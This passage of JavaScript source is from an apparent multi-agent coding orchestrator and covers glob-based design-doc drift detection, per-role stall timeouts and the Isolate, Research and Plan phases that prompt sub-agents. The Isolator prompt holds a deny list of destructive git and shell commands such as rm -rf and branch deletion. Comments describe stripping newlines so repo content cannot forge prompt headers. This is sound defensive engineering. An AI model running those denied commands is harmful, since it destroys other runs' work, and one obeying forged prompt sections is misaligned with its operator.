    warnings.push(`config.design.map is not an array (${typeof c.map}) — ignored. Expected [{ glob, doc }].`)
    return { map, warnings }
  }
  const entries = c.map.slice(0, DESIGN_MAP_MAX)
  if (c.map.length > DESIGN_MAP_MAX) warnings.push(`config.design.map has ${c.map.length} entries — only the first ${DESIGN_MAP_MAX} are used.`)
  entries.forEach((raw, i) => {
    const at = `config.design.map[${i}]`
    if (!raw || typeof raw !== 'object' || Array.isArray(raw)) {
      warnings.push(`${at} is not an object — ignored.`)
      return
    }
    for (const key of Object.keys(raw)) {
      if (!DESIGN_ENTRY_KEYS.includes(key)) warnings.push(`${at}.${key} is not a known key — ignored. Keys: ${DESIGN_ENTRY_KEYS.join(', ')}`)
    }
    const glob = typeof raw.glob === 'string' ? raw.glob.trim() : ''
    const doc = typeof raw.doc === 'string' ? raw.doc.trim() : ''
    if (!glob) {
      warnings.push(`${at}.glob is missing or not a non-empty string — entry ignored.`)
      return
    }
    if (glob.length > DESIGN_GLOB_MAX) {
      warnings.push(`${at}.glob is ${glob.length} chars, over the ${DESIGN_GLOB_MAX} limit — entry ignored.`)
      return
    }
    const wildcards = (glob.match(/\*/g) || []).length
    if (wildcards > DESIGN_GLOB_WILDCARDS_MAX) {
      warnings.push(`${at}.glob has ${wildcards} wildcard characters, over the ${DESIGN_GLOB_WILDCARDS_MAX} limit — entry ignored.`)
      return
    }
    // detectDesignDrift matches the glob in the same normalized form it puts
    // every changed path through, so `./src/**` and `src\auth\**` are live
    // spellings rather than dead ones. What normalizes to nothing at all (`/`,
    // `./`, `..`) can never match and is rejected here instead of accepted and
    // silently never firing.
    if (!normalizeIssuePath(glob)) {
      warnings.push(`${at}.glob names no path once normalized (${JSON.stringify(collapseLines(glob))}) — entry ignored. A glob is matched against normalized paths, so it must name at least one path segment.`)
      return
    }
    if (!doc) {
      warnings.push(`${at}.doc is missing or not a non-empty string — entry ignored.`)
      return
    }
    const safeDoc = safeMigrationsDir(doc)
    if (!safeDoc) {
      warnings.push(`${at}.doc is not a safe repo-relative path (${JSON.stringify(collapseLines(doc))}) — entry ignored. It is rendered into an agent's prompt as a path, so absolute paths, \`..\` segments and dot/dash-leading segments are rejected.`)
      return
    }
    map.push({ glob, doc: safeDoc })
  })
  return { map, warnings }
}

// Matching is a bounded table walk, and no RegExp may ever be compiled from a
// glob here: no cap resolveDesignMap can enforce bounds RegExp backtracking,
// since a shape like `*a*a*a*a*a*a*a*a*a*a` is 20 characters with 10 wildcards
// and passes every one of those limits with no warning. This runs at
// phaseRecord, after the code is written and reviewed, with no watchdog, over a
// glob that reached CONFIG from repo content.
//
// The table is one boolean per path position per token — at most 200 x 401
// cells, every one visited once, whatever shape the glob has. Nothing is ever
// compiled, so `src/(a|b)/**` is literal by construction rather than by
// escaping, and there is no `lastIndex` to leak between files.
//
// `**` matches any run of characters including `/`; a single `*` matches any
// run containing no `/`; every other character is literal. A run of three or
// more stars is `**`. The match is anchored at both ends — a glob of `docs`
// matches the path `docs` and nothing else, or the drift block would fire on
// every path containing that substring. An empty glob matches nothing, which is
// why detectDesignDrift skips such an entry rather than reporting it.
function globMatch(glob, path) {
  const g = String(glob ?? '').trim()
  const p = String(path ?? '')
  if (!g) return false

  const tokens = []
  for (let i = 0; i < g.length; i++) {
    if (g[i] === '*') {
      let stars = 0
      while (i < g.length && g[i] === '*') { stars++; i++ }
      i--
      tokens.push({ star: stars > 1 ? 2 : 1 })
    } else {
      let lit = ''
      while (i < g.length && g[i] !== '*') { lit += g[i]; i++ }
      i--
      tokens.push({ lit })
    }
  }

  // `**` immediately followed by `/` is one token, not two: the slash belongs to
  // the wildcard, because `**/` is allowed to match zero directories and there
  // is then no slash left for a literal to consume. Folding it here keeps the
  // sweep below a single pass per token.
  for (let i = 0; i < tokens.length - 1; i++) {
    const cur = tokens[i]
    const nxt = tokens[i + 1]
    if (cur.star === 2 && nxt.lit !== undefined && nxt.lit.startsWith('/')) {
      delete cur.star
      cur.starSlash = true
      if (nxt.lit.length === 1) tokens.splice(i + 1, 1)
      else nxt.lit = nxt.lit.slice(1)
    }
  }

  // reach[j] is true when the tokens consumed so far match exactly the first j
  // characters of the path.
  let reach = new Array(p.length + 1).fill(false)
  reach[0] = true
  for (const token of tokens) {
    const next = new Array(p.length + 1).fill(false)
    if (token.lit !== undefined) {
      for (let j = 0; j <= p.length; j++) {
        if (reach[j] && p.startsWith(token.lit, j)) next[j + token.lit.length] = true
      }
    } else if (token.star !== undefined) {
      // One left-to-right sweep rather than a nested loop over start positions:
      // `carry` means "some reachable position can stretch this far", which a
      // single `*` loses the moment it passes a `/` and `**` never does.
      let carry = false
      for (let j = 0; j <= p.length; j++) {
        if (j > 0 && token.star === 1 && p[j - 1] === '/') carry = false
        carry = carry || reach[j]
        next[j] = carry
      }
    } else {
      // `**/` matches ZERO or more directories, which is what every other glob
      // implementation means by it and what a project writing the idiomatic
      // `src/**/*.test.ts` expects. Without the zero case that glob misses
      // every file directly under `src/`, and this detector's whole job is to
      // not be silent — a map entry that quietly matches nothing reports no
      // drift and looks exactly like a healthy one.
      // Two ways to land: consume nothing (reach[j] itself), or consume any run
      // that ENDS on a `/` (carry from strictly before j, with p[j-1] === '/').
      let carry = false
      for (let j = 0; j <= p.length; j++) {
        next[j] = reach[j] || (j > 0 && p[j - 1] === '/' && carry)
        carry = carry || reach[j]
      }
    }
    reach = next
  }
  return reach[p.length]
}

// files_changed is CODER_SCHEMA `array of string` with no pattern — model
// authored and length-unbounded — and every entry is walked against every glob,
// so the work here is N x M tables. Both dimensions are capped: M by
// DESIGN_MAP_MAX above, N here, plus a per-path length limit, because a single
// absurdly long path is the other half of the same cost.
const DRIFT_FILES_MAX = 200
const DRIFT_PATH_MAX = 400

// files_changed is what a Coder reported, and a Coder inside a worktree reports
// `/home/u/repo/src/auth/x.ts` for the file the map calls `src/auth/**` — the
// same mismatch normalizeIssuePath exists for upstream. So every path goes
// through the same normalizer, `doc` is compared with sameFilePath rather than
// by equality, and the glob is also tried with a leading `**/` so a
// repo-relative pattern still matches a path carrying the worktree root ahead
// of it. That leading prefix over-reports in principle — glob `docs` also
// matches `vendor/docs` — in the direction that costs a backlog line rather
// than silence, the same trade sameFilePath already documents.
// BOTH SIDES of the comparison go through that normalizer, never one. A glob
// spelled `./src/**`, `/src/**`, `src//**`, `src/**/` or `src\auth\**` passes
// every check resolveDesignMap makes, so matching a raw glob against a
// normalized path is a mapping accepted with no warning that can never fire —
// the same "declared a map, nothing happens, no signal" failure this block
// exists to remove.
// Matching is on the normalized form; what gets REPORTED is the path the Coder
// wrote, because a backlog item naming `home/u/repo/src/auth/x.ts` — normalized,
// leading slash gone — names a file that exists nowhere. Both forms are held to
// DRIFT_PATH_MAX: the normalized one is the cost bound, the raw one is what
// reaches the prompt.
function detectDesignDrift(map, filesChanged) {
  const entries = Array.isArray(map) ? map : []
  if (!entries.length) return []
  const files = (Array.isArray(filesChanged) ? filesChanged : [])
    .slice(0, DRIFT_FILES_MAX)
    .map(f => ({ raw: String(f ?? '').trim(), path: normalizeIssuePath(f) }))
    .filter(f => f.path && f.path.length <= DRIFT_PATH_MAX && f.raw.length <= DRIFT_PATH_MAX)
  if (!files.length) return []
  const drifted = []
  for (const entry of entries) {
    const glob = typeof entry?.glob === 'string' ? normalizeIssuePath(entry.glob) : ''
    if (!glob) continue
    const matched = files.filter(f => globMatch(glob, f.path) || globMatch(`**/${glob}`, f.path))
    // The doc moving with the code is the whole point — that run is healthy and
    // has nothing to report.
    // One direction, deliberately, unlike the forbiddenDocs check below.
    // `entry.doc` is already repo-relative and validated, so only the changed
    // path can be the longer form; sameFilePath also matches the short side
    // against the long one, which lets a root-level `auth.md` stand in for
    // `docs/design/auth.md` and SUPPRESS the drift report. Suppression is the
    // silent direction this block must never fail in.
    if (!matched.length || files.some(f => f.path === entry.doc || f.path.endsWith(`/${entry.doc}`))) continue
    drifted.push({ doc: entry.doc, glob: entry.glob, matched: matched.map(f => f.raw) })
  }
  return drifted
}

// Empty string for an empty list, so a project that declared no map pays no
// prompt block at all and its Record prompt stays byte-identical to today's.
// Every string here is collapsed before it is rendered: `doc` and `glob` came
// from repo-authored config and the matched paths came from a model, and any of
// the three carrying `\n## ISSUES` would forge a section header in this prompt.
function renderDesignDrift(drifted) {
  const list = Array.isArray(drifted) ? drifted : []
  if (!list.length) return ''
  const shown = list.slice(0, RENDER_LIST_MAX)
  const lines = ['\n\n## DESIGN DOC DRIFT (record only — never open, create or edit the document)']
  shown.forEach(d => {
    lines.push(`- ${collapseLines(d?.doc)} — glob \`${collapseLines(d?.glob)}\` matched: ${capList((Array.isArray(d?.matched) ? d.matched : []).map(m => collapseLines(m))).join(', ')}`)
  })
  if (list.length > shown.length) lines.push(`+${list.length - shown.length} more`)
  lines.push('The project mapped each document to code it describes; that code changed in this run and the document did not. Write one backlog item per line above — which document, which files moved — and stop there. **Do not open, create or edit any of these documents.** LDO defines no format for them and does not write them; whether the drift matters is the operator\'s call, not yours.')
  return lines.join('\n')
}

// Resolved once, here rather than beside BACKLOG_DESTINATION above, because
// every DESIGN_* limit this reads is a `const` declared in this block — a
// call placed higher throws a TDZ error before the run starts. Same
// resolve-once, warn-once discipline as the two blocks around it.
const { map: DESIGN_MAP, warnings: DESIGN_WARNINGS } = resolveDesignMap(CONFIG.design)
DESIGN_WARNINGS.forEach(w => log(`⚠ ${w}`))

// Merged once at module scope, not per routeModels() call: routeModels runs
// twice per feature and N times in a multi-feature run, so warning inside it
// would repeat the operator's typo once per call. The cost is a temporal
// dependency — routeModels is hoisted but reads this const, so a call placed
// above this line would throw a TDZ error. Both current call sites are below.
const { table: MODEL_TABLE, warnings: MODEL_WARNINGS } = mergeModelTable(DEFAULT_MODELS, CONFIG.models)
MODEL_WARNINGS.forEach(w => log(`⚠ ${w}`))

// Claude Code's own stall watchdog clears only on a tool_use block. While a
// model is composing a large StructuredOutput call — no tool_use emitted yet —
// that looks identical to a hung agent, and the harness aborts it at its
// 180000ms default. That's what killed issue #3's Planner: six attempts, each
// dying at exactly 180.0s of silence after the last tool_result, ~992k tokens
// burned, zero output. This map raises the budget per role.
// Keyed by ROLE, not by complexity tier: output size tracks the schema the
// role fills (VERDICT_SCHEMA carries verification criteria and attacks even on
// a trivial task), and a per-complexity scale structurally cannot cover the
// Planner — its own call is what PRODUCES the complexity rating, so no rating
// exists yet when that call needs its budget. A tier-keyed map (trivial/
// medium/complex) would also collide with the row regex scripts/check-model-
// table.sh matches across four files; a role-keyed one doesn't.
// recorder is left at 180000, the harness default, on purpose — it writes
// through tools, so tool_use events keep resetting its clock naturally. (It runs
// on sonnet, not haiku; the model is not what makes 180000 enough here.)
// Blanket-raising every role regardless of whether it needs it is the thing
// not to do here.
// The cost of getting this wrong the other way: the harness retries a
// genuinely stalled agent 5 times (6 attempts total), so planner/reviewer at
// 480000 means a real hang now costs up to 48 minutes instead of 18. That's
// the accepted trade against the 47-minute, zero-output run in issue #3.
const DEFAULT_STALL_MS = { planner: 480000, reviewer: 480000, coder: 360000, security: 300000, researcher: 300000, recorder: 180000 }
const MIN_STALL_MS = 1000
const STALL_MS = { ...DEFAULT_STALL_MS }
for (const role of Object.keys(DEFAULT_STALL_MS)) {
  const override = CONFIG.stallMs?.[role]
  if (override === undefined) continue
  const n = Number(override)
  if (Number.isFinite(n) && n >= MIN_STALL_MS) {
    STALL_MS[role] = n
  } else {
    // Two failure shapes, one rejection. A malformed value (string, 0,
    // negative, NaN) reaching setTimeout(NaN) fires immediately and turns
    // every call for that role into an instant 6x abort loop. A small
    // positive number is the same loop arrived at by a seconds/milliseconds
    // mix-up — `{planner: 480}` reads as eight minutes and means 480ms — so
    // the floor catches the unit error the type check can't. One second can't
    // reject a legitimate budget: the harness default is already 180000.
    log(`⚠ config.stallMs.${role} is invalid (${JSON.stringify(override)}) — expected milliseconds, at least ${MIN_STALL_MS}. Keeping default ${DEFAULT_STALL_MS[role]}ms`)
  }
}
// A key the map doesn't contain is never visited by the loop above, so a
// typo'd or wrong-case role would be silently discarded — the operator
// believes they raised a budget and nothing in the log says otherwise. Warn
// on it, the same way an invalid value warns.
for (const key of Object.keys(CONFIG.stallMs || {})) {
  if (!(key in DEFAULT_STALL_MS)) log(`⚠ config.stallMs.${key} is not a known role — ignored. Roles: ${Object.keys(DEFAULT_STALL_MS).join(', ')}`)
}

// Parses args.tasks into {task, label}[] with unique labels, or null if this
// isn't a multi-feature run (falls through to the single-task path below).
// Labels come from an explicit `label` field or slugify(task); collisions get
// -2, -3, ... suffixes, same convention as the Recorder's file naming.
function normalizeTasks(a) {
  const raw = a?.tasks
  if (!Array.isArray(raw) || raw.length === 0) return null

  const seen = new Map()
  return raw.map((entry, i) => {
    const t = typeof entry === 'string' ? entry : entry?.task
    if (typeof t !== 'string' || !t.trim()) {
      throw new Error(`tasks[${i}] is malformed — expected a string or {task, label?}`)
    }
    const requestedLabel = typeof entry === 'object' ? entry.label : null
    let label = slugify(requestedLabel || t, `feature-${i + 1}`)
    const n = (seen.get(label) || 0) + 1
    seen.set(label, n)
    if (n > 1) label = `${label}-${n}`
    return { task: t, label }
  })
}

// Security is gated on attack surface, not task size — a one-line change to an
// auth check is trivial work with elevated risk. The Planner rates this; the
// dedicated agent runs only when that rating is `elevated`.
// forceElevated is set only for a resumePlan run whose recovered plan carries
// no security_surface — there was no Planner call to rate it, so treating an
// absent rating as 'none' would silently turn off the one phase that exists
// to catch new attack surface. An explicit `security: false` still overrides
// this, same as it overrides any other rating.
function securityEnabled(plan, forceElevated) {
  if (args?.security !== undefined) return args.security
  if (CONFIG.securityByDefault !== undefined) return CONFIG.securityByDefault
  if (forceElevated) return true
  return plan.security_surface === 'elevated'
}

// Research and Plan run before complexity is known — resolve their models up
// front, always from the 'medium' row. This is why prePlanModels.planner is
// the only planner value that ever actually takes effect at runtime — the
// trivial/complex rows' planner entries exist for config shape, not because
// a different complexity rating changes which model plans it.
const prePlanModels = routeModels('medium')

// ═══════════════════════════════════════════
// PHASE FUNCTIONS
// ═══════════════════════════════════════════

// ── phaseIsolate ───────────────────────────

// Creating the worktree is a whole agent's only job because a side task
// competing with a real one is exactly what a model drops silently. Issue #12
// measured it with a control pair: two runs in one session, same isolate:true
// flag — the one whose task prose happened to carry the worktree command got a
// worktree, the one without it edited the operator's tree, 27 files and 1678
// insertions, nothing logged. Nothing here rests on the agent saying it worked;
// the orchestrator cross-checks four independent git outputs instead.
async function phaseIsolate(task, ctx, logStage, logPrefix) {
  if (!ctx.isMulti) return { isolation: null }

  logStage('Isolate')

  const proof = await agentWithRetry(
    `Create this feature's isolated git worktree. That is your ONLY job — do not read the codebase, do not plan, do not edit any file except the one .gitignore line below.\n\n` +
    `## THE FEATURE\n${task}\n\n` +
    `## WHAT TO DO\n` +
    `1. From the repository root, before creating anything: if \`.gitignore\` does not already ignore \`.worktrees/\`, append that one line. The directory holds sibling worktrees, not source, and an unignored full checkout shows as untracked noise in every later \`git status\`.\n` +
    `2. Capture \`git rev-parse --show-toplevel\` as \`main_root\` and \`git rev-parse HEAD\` as \`base_head\`, both from the main checkout, BEFORE the next step.\n` +
    `3. Run \`git worktree add ${ctx.worktreeHint.suggestedPath} -b ${ctx.worktreeHint.suggestedBranch}\`. The \`-b\` is mandatory: never \`-B\`, never a bare branch argument, never an existing branch. Creating the branch fresh from the current HEAD is part of what is verified.\n` +
    `4. If that fails because the path or the branch already exists, another run owns it — retry with a \`-2\`, \`-3\`, \`-4\`, then \`-5\` suffix on BOTH the path and the branch, staying under \`.worktrees/\`. If all five are taken, stop and report the failure in \`notes\`; do not free one up.\n` +
    `5. \`cd\` INSIDE the new directory, then run and report verbatim: \`git rev-parse --show-toplevel\` (toplevel), \`git rev-parse --absolute-git-dir\` (git_dir), \`git symbolic-ref --short HEAD\` (head_branch), \`git rev-parse HEAD\` (head_sha).\n` +
    `6. From anywhere in the repo, report \`git worktree list --porcelain\` verbatim as \`worktree_list\` — every line, unedited.\n\n` +
    `## NEVER\n` +
    `Only additive creation is allowed. NEVER run \`git worktree remove\`, \`git worktree prune\`, \`git worktree add -B\`, \`git branch -D\`, \`git branch -f\`, \`rm -rf\`, or anything with \`--force\`. NEVER run \`git push\`, \`git fetch\`, or any other remote or credential operation. A worktree you obtained by destroying another run's produces a perfectly valid report and silently costs that run its work.\n\n` +
    `## HOW THIS IS CHECKED\n` +
    `The orchestrator cross-checks those outputs against each other and aborts the whole run if they do not agree. A value you did not get by actually running the command will not match, so there is nothing to gain by filling a field in from memory — reporting the failure is strictly better than reporting a plausible path.`,
    // Hardcoded, not routed: no entry is added to DEFAULT_MODELS because that
    // table is duplicated across four files under scripts/check-model-table.sh
    // and this role has nothing an operator would want to tune. Not haiku —
    // every haiku sub-agent in this pipeline died on a thinking/context_management
    // 400, which is how the Record phase silently wrote nothing for four releases.
    // No stallMs: the Isolator is nothing but tool calls, so the watchdog's clock
    // keeps resetting on its own. (The Recorder DOES take one — STALL_MS.recorder,
    // left at the harness default — because an operator may need to raise it.)
    { label: `${ctx.label}:isolator`, phase: 'Isolate', model: 'sonnet', agentType: 'isolator', schema: ISOLATION_SCHEMA, ledger: ctx.ledger }
  )

  const verified = verifyWorktreeProof(proof)
  if (!verified.ok) {
    // Loud, and terminal. Falling through to a working-tree run is exactly the
    // silent failure this phase exists to remove: the operator asked for
    // isolation, and a run that quietly writes 27 files into their tree instead
    // costs more than a run that stops.
    log(`${logPrefix}ERROR: Isolation could not be verified — ${verified.reason}. No Planner, Coder or Reviewer will run; nothing was written to the working tree.`)
    if (proof?.notes) log(`${logPrefix}  Isolator notes: ${quoteRejected(proof.notes)}`)
    log(`${logPrefix}  If a previous run left stale worktrees behind, prune them with \`git worktree remove .worktrees/<name>\` and \`git branch -D ldo/<name>\`, then re-run.`)
    return { error: `Isolation could not be verified: ${verified.reason}`, label: ctx.label, task, approved: false }
  }

  log(`${logPrefix}Worktree verified: ${verified.path} (${verified.branch})`)
  return { isolation: { path: verified.path, branch: verified.branch, root: verified.root } }
}

// ── phaseResearch ──────────────────────────

const RESOLVED_SURFACE_COVERAGE = new Set(['covered', 'not_applicable', 'resolved'])

function unresolvedSurfaceCoverage(plan) {
  const analysis = plan?.surface_analysis
  if (!analysis || typeof analysis.project_type !== 'string' || !Array.isArray(analysis.surfaces) || !analysis.surfaces.length || analysis.surfaces.length > 20) {
    return [{ id: 'surface-analysis', name: 'Surface analysis', coverage: 'missing', reason: 'the required matrix is absent or empty' }]
  }
  const seen = new Set()
  return analysis.surfaces.filter(surface => {
    if (!surface || !/^[a-z0-9][a-z0-9-]{0,63}$/.test(surface.id || '') || seen.has(surface.id)) return true
    seen.add(surface.id)
    if (!RESOLVED_SURFACE_COVERAGE.has(surface.coverage)) return true
    if (!Array.isArray(surface.evidence) || !surface.evidence.some(item => String(item || '').trim())) return true
    return false
  })
}

function unresolvedProductConflicts(plan) {
  return (Array.isArray(plan?.conflicts) ? plan.conflicts : []).filter(item => item && !String(item).startsWith('NONE —'))
}

async function researchSurfaceGaps(task, plan, gaps, ctx, logStage, logPrefix) {
  logStage('Research')
  const report = await runAgent(
    `Research only the unresolved surface requirements below. Map every finding and contract candidate to the supplied stable surface ID. Follow the /ldo-contract proposal procedure: one checkable rule per candidate, route scope/security/code separately, use a narrow docs/contracts/<area>.md for product-domain policy, keep the rule at most 200 characters, put provenance in evidence, and NEVER write a contract.\n\n## TASK\n${task}\n\n## PROJECT TYPE\n${plan.surface_analysis?.project_type || 'unknown'}\n\n## UNRESOLVED SURFACES\n${JSON.stringify(gaps, null, 2)}`,
    { label: ctx.isMulti ? `${ctx.label}:researcher-surfaces` : 'researcher-surfaces', phase: 'Research', model: prePlanModels.researcher, agentType: 'researcher', schema: RESEARCH_SCHEMA, stallMs: STALL_MS.researcher, ledger: ctx.ledger }
  )
  if (!report) log(`${logPrefix}⚠ Required surface research returned nothing; coverage remains blocked.`)
  return report
}

async function phaseResearch(task, ctx, logStage, logPrefix) {
  if (!DO_RESEARCH) {
    return { researchReport: null }
  }

  logStage('Research')

  const researchReport = await runAgent(
    `Deep-research this topic. Cross-verify claims across independent sources.\n\n## TOPIC\n${task}`,
    { label: ctx.isMulti ? `${ctx.label}:researcher` : 'researcher', phase: 'Research', model: prePlanModels.researcher, agentType: 'researcher', schema: RESEARCH_SCHEMA, stallMs: STALL_MS.researcher, ledger: ctx.ledger }
  )

  if (researchReport) {
    const high = researchReport.findings?.filter(f => f.confidence === 'high').length || 0
    log(`${logPrefix}Research: ${researchReport.findings?.length || 0} findings (${high} high-confidence), ${researchReport.recommendations?.length || 0} recommendations`)
  } else {
    log(`${logPrefix}⚠ Research returned nothing — proceeding without it.`)
  }

  return { researchReport }
}

// ── phasePlan ──────────────────────────────

async function phasePlan(task, ctx, researchReport, isolation, logStage, logPrefix) {
  logStage('Plan')

  // The worktree exists and has been verified before this phase runs, so this
  // block only says where it is. The reinforcement sentence is belt-and-braces
  // for a Planner that somehow lands in the main tree anyway — creating it is
  // deliberately not the Planner's job; see phaseIsolate for why.
  const worktreeTrigger = isolation
    ? renderWorktree(isolation.path, isolation.branch, ctx.label) +
      `That worktree already exists and was created for you — \`cd\` there before reading anything. If it is somehow missing, run \`git worktree add ${isolation.path} -b ${isolation.branch}\` and report that same path and branch.\n\n`
    : ''

  // Identical in plan-only and full runs on purpose: varying it on PLAN_ONLY
  // would fork the cache prefix for no gain — the Planner's job is the same
  // either way.
  const sizingBrief = `## SIZING\nThis project treats ${MAX_STEPS_PER_RUN} steps as the soft ceiling for one run. ` +
    (PREFER_SPLIT
      ? 'The operator prefers short atomic runs — if this task is really several, say so.'
      : 'The operator has asked for this to be planned as ONE run — only flag a split if the task is genuinely incoherent as a single run.') +
    ' Fill `sizing` either way; it is advisory and blocks nothing.\n\n'

  // Placed after the sizing brief and before the TASK block on purpose: a task
  // that supplies nothing renders '' here, so an untriggered run keeps today's
  // cache prefix byte for byte and pays nothing for a mechanism it never needs.
  const artifactMarkers = detectSuppliedArtifact(task)
  const reconciliationBrief = renderReconciliationBrief(artifactMarkers)

  // resumePlan is checked ABOVE every guard below (the `if (!plan)` failure
  // guard, the multi-mode worktree guard, safeMigrationsDir) so a recovered
  // plan passes through every gate a Planner-produced plan does. It is
  // rejected outright — never validated and used — whenever ctx.isMulti is
  // true. That covers both args.tasks (already filtered out at config time,
  // above) and isolate:true, which also sets ctx.isMulti but isn't visible
  // there. This is the live control that keeps a recovered worktree_path away
  // from renderWorktree and verifyAgentLocation — see resumePlanRejection's
  // worktree_path branch for why that matters.
  let plan = null
  let planFromResume = false
  if (RESUME_PLAN !== undefined) {
    if (ctx.isMulti) {
      log(`${logPrefix}⚠ resumePlan ignored (isolated/multi-feature run — a recovered plan names a worktree from a dead run that this run cannot verify exists) — running the Planner normally.`)
    } else {
      const reason = resumePlanRejection(RESUME_PLAN)
      if (reason) {
        log(`${logPrefix}⚠ resumePlan ignored (${reason}) — running the Planner normally.`)
      } else {
        plan = RESUME_PLAN
        planFromResume = true
        log(`${logPrefix}Plan supplied via resumePlan — Planner skipped (${plan.steps.length} step(s) recovered).`)
      }
    }
  }

  if (!plan) {
    plan = await agentWithRetry(
      worktreeTrigger + renderResearch(researchReport) + sizingBrief + reconciliationBrief + `Read the codebase and plan this task.\n\n## TASK\n${task}`,
      { label: ctx.isMulti ? `${ctx.label}:planner` : 'planner', phase: 'Plan', model: prePlanModels.planner, agentType: 'planner', schema: PLAN_SCHEMA, stallMs: STALL_MS.planner, ledger: ctx.ledger }
    )
  }

  if (!plan) {
    log(`${logPrefix}ERROR: Planner failed.`)
    return { error: 'Planner failed', label: ctx.label, task }
  }

  let coverageGaps = unresolvedSurfaceCoverage(plan)
  if (coverageGaps.some(gap => gap?.coverage === 'research_required')) {
    const surfaceResearch = await researchSurfaceGaps(task, plan, coverageGaps, ctx, logStage, logPrefix)
    if (surfaceResearch) {
      researchReport = surfaceResearch
      const previousPlan = plan
      plan = await agentWithRetry(
        worktreeTrigger + renderResearch(surfaceResearch) + sizingBrief + reconciliationBrief +
        `Resolve the surface-to-contract matrix and produce the final implementation plan. Preserve every stable surface ID from the previous plan; do not delete a surface to clear a gap. An established engineering standard may become resolved with evidence. A new project policy stays contract_candidate until the operator accepts, adjusts, or skips it via /ldo-contract.\n\n## PREVIOUS PLAN\n${JSON.stringify(previousPlan, null, 2)}\n\n## TASK\n${task}`,
        { label: ctx.isMulti ? `${ctx.label}:planner-resolution` : 'planner-resolution', phase: 'Plan', model: prePlanModels.planner, agentType: 'planner', schema: PLAN_SCHEMA, stallMs: STALL_MS.planner, ledger: ctx.ledger }
      )
      if (!plan) return { error: 'Planner failed after required surface research', label: ctx.label, task }
      coverageGaps = unresolvedSurfaceCoverage(plan)
    }
  }

  const productConflicts = unresolvedProductConflicts(plan)
  if (coverageGaps.length || productConflicts.length) {
    coverageGaps.forEach(gap => log(`${logPrefix}✗ Surface coverage unresolved [${gap?.coverage || 'missing'}] ${gap?.id || '(no id)'}: ${gap?.name || gap?.resolution || 'missing evidence'}`))
    productConflicts.forEach(conflict => log(`${logPrefix}✗ Product choice unresolved: ${collapseLines(conflict)}`))
    log(`${logPrefix}⏹ Resolution required before Security or Code. Accept, adjust, or skip contract candidates via /ldo-contract, then resume with the resolved plan.`)
    return { resolutionRequired: true, mode: 'resolution-required', approved: false, plan, researchReport, unresolvedCoverage: coverageGaps, unresolvedConflicts: productConflicts, label: ctx.label, task }
  }

  // The host-side half of the contract-length signal. Logged here rather than
  // rendered into a prompt: the audience is the operator, who is the only one
  // who can go and split the entry, and the agents downstream already receive
  // the compressed text with renderConstraints' truncation marker on it.
  contractWarnings(plan).forEach(w => log(`${logPrefix}⚠ ${w}`))

  // Asserts the orchestrator holds a verified worktree, not that the Planner
  // claimed one — a non-empty model-authored string is satisfied by a Planner
  // that skipped the step entirely, which is how every later agent ended up
  // cd-ing into a directory that did not exist. Calling phasePlan without the
  // proof would restore that hole, so it fails here rather than downstream.
  if (ctx.isMulti && !isolation) {
    log(`${logPrefix}ERROR: no verified worktree for this feature — refusing to continue agents into an undefined directory.`)
    return { error: 'No verified worktree — the Isolate phase did not run before Plan', label: ctx.label, task, plan }
  }

  if (isolation) {
    // A mismatch warns rather than fails: the Planner only reads, and the
    // orchestrator's verified value is what every later prompt carries anyway.
    // Suffix comparison, the same rule verifyAgentLocation uses — an absolute
    // report of the same directory is not a disagreement.
    const claimed = String(plan.worktree_path || '').trim().replace(/\/+$/, '')
    if (claimed && claimed !== isolation.path && !claimed.endsWith('/' + isolation.path)) {
      log(`${logPrefix}⚠ Planner reported a different worktree than the verified one: ${quoteRejected(plan.worktree_path)} — using the verified path ${isolation.path}.`)
    }
    plan.worktree_path = isolation.path
    plan.branch = isolation.branch
  }

  // Validate once, here, so renderPlan/enforceMigrationGate/the Reviewer's prompt
  // never see a rejected directory string — a Planner-supplied path often
  // originates in pasted task text, not the operator's own keyboard, and it
  // reaches a shell command downstream in the Reviewer's hands.
  if (plan.migrations?.count > 0 && !safeMigrationsDir(plan.migrations.directory)) {
    log(`${logPrefix}⚠ Rejected migrations.directory as unsafe: ${quoteRejected(plan.migrations.directory)} — migration gate disabled for this run.`)
    delete plan.migrations
  }

  // Same reason, same place: validated here so no downstream renderer ever
  // re-checks it, and deleted rather than nulled so nothing can re-trust it.
  if (plan.codebase_context?.test_command_scoped !== undefined) {
    const scoped = safeScopedTemplate(plan.codebase_context.test_command_scoped, plan.codebase_context.test_command)
    if (scoped) plan.codebase_context.test_command_scoped = scoped
    else {
      log(`${logPrefix}⚠ Rejected test_command_scoped as unsafe: ${quoteRejected(plan.codebase_context.test_command_scoped)} — scoped test runs disabled for this run, the full suite will be used.`)
      delete plan.codebase_context.test_command_scoped
    }
  }

  // Closes the only route a resumed plan has to a shell — see
  // stripRecoveredCommands for why all three fields go unconditionally, and
  // renderRecoveredCommands for what the two executing agents are told in their
  // place. The log fires only when something was actually removed, so a resume
  // of a plan that never carried them stays quiet.
  const droppedCommands = stripRecoveredCommands(planFromResume, plan)
  if (droppedCommands.length) log(`${logPrefix}⚠ resumePlan: dropped ${droppedCommands.join('/')} — a recovered command string is executed by the Coder and cannot be verified from a dead run; the Coder and the Reviewer are told to rediscover them.`)

  // Computed once, here, so the Coder and the Reviewer are told the same
  // thing: a run where one scoped and the other ran everything produces a
  // baseline and a final comparison at different widths, which manufactures
  // phantom entries in pre_existing_failures.
  const scopedTests = renderScopedTests(plan, TEST_SCOPE)
  if (scopedTests.mode === 'scoped') log(`${logPrefix}Tests: scoped runs enabled (${plan.codebase_context.test_command_scoped})`)
  else log(`${logPrefix}Tests: full-suite mode — ${scopedTests.reason}`)
  if (scopedTests.dropped.length) {
    log(`${logPrefix}  ⚠ ${scopedTests.dropped.length} path(s) excluded from scoped test selection (unsupported characters): ${scopedTests.dropped.join(', ')} — those files were not covered by the scoped runs`)
  }
  // Resolved once, beside the mode it depends on, and carried on the same
  // object: deriving it separately at the two places that need it (the Coder's
  // prompt and the result's status) is how a run tells the Coder to skip the
  // suite and then reports 'not_run' as though the Coder had simply not run it.
  const fullSuiteAt = effectiveFullSuiteAt(FULL_SUITE_AT, scopedTests.mode)
  if (fullSuiteAt !== FULL_SUITE_AT) {
    log(`${logPrefix}  config.tests.fullSuiteAt '${FULL_SUITE_AT}' does not apply under full-suite mode — every run is already the whole suite. Using '${fullSuiteAt}'.`)
  } else if (fullSuiteAt !== DEFAULT_FULL_SUITE_AT) {
    log(`${logPrefix}  Full suite: ${fullSuiteAt === 'never' ? 'not run anywhere in the pipeline' : 'deferred to /ldo-ship'} (config.tests.fullSuiteAt: '${fullSuiteAt}') — the Coder is told not to run it.`)
  }
  scopedTests.fullSuiteAt = fullSuiteAt

